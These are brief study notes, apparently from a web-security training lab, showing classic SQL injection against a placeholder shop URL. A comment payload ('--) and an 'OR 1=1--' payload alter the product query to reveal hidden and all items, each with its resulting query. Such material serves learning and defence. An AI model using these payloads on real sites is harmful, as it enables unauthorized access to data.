Target:
https://insecure-website.com/products?category=Gifts

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

START ATTACKING

WEB ATTACK
https://insecure-website.com/products?category=Gifts '--

QUERY
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1

Display All Product

https://insecure-website.com/products?category=Gifts'+OR+1=1--'

The modified query returns all items where either the category is Gifts, or 1 is equal to 1. as
1=1 is always true, the query returns all items.


